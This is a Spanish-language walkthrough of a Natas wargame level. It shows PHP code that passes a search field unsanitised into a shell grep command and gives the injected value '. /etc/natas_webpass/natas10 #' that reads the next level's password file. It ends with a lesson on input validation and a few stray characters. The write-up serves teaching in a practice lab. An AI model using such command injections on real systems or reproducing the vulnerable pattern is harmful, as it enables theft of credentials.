La página inicial nos muestra el texto `Find words containing` junto con un cuadro de búsqueda con campo `needle` y el siguiente código:
```php
<?  
$key = "";  
  
if(array_key_exists("needle", $_REQUEST)) {    $key = $_REQUEST["needle"];  
}  
  
if($key != "") {    passthru("grep -i $key dictionary.txt");  
}  
?>
```

Aquí se reemplaza el valor ingresado en `needle` dentro del comando `grep -i $key dictionary.txt` que devolverá el texto de `dictionary.txt`, que coincida con el patrón ingresado.

Recordando las instrucciones iniciales de Natas, todos los niveles tienen acceso a la contraseña del nivel siguiente a través de la ruta `/etc/natas_webpass/` y observamos que podemos modificar el valor de `needle` para realizar la búsqueda en esta ruta.

Modificamos `needle` con el valor `. /etc/natas_webpass/natas10 #` para devolver el contenido de `/etc/natas_webpass/natas10`, dónde:
* `.` hace coincidir todo el texto del archivo.
* `/etc/natas_webpass/natas10` es la ruta del archivo.
* `#` comenta el resto de la línea para evitar el contenido de `dictionary.txt`

Obteniendo este comando:
```
grep -i . /etc/natas_webpass/natas10 # dictionary.txt
```

Al enviar `. /etc/natas_webpass/natas10 #` en el formulario vemos la contraseña del nivel siguiente.

---
## **Conclusión**

Este nivel demuestra la importancia de validar y limpiar las entradas del usuario, especialmente cuando se utilizan en comandos del sistema. Permitir que las entradas interactúen directamente con funciones como `passthru()` abre la puerta a vulnerabilidades graves, como la ejecución arbitraria de comandos. 

---
-,"  
[_P